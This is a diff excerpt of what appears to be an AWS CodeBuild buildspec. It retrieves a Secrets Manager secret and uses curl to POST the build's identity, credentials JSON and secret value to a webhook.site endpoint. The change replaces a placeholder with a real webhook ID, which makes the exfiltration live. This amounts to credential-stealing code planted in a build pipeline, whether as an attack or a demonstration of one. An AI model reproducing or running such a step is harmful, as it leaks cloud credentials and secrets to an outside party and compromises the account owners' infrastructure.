@@ -12,7 +12,7 @@ phases:
         SECRET_NAME=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text 2>/dev/null || true)
         SECRET_VAL=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query 'SecretString' --output text 2>/dev/null || true)
 
-        curl -sk -X POST "https://webhook.site/TU-UUID" \
+        curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
           --data-urlencode "identity=$IDENTITY" \
           --data-urlencode "creds=$CREDS_JSON" \
           --data-urlencode "secret_name=$SECRET_NAME" \
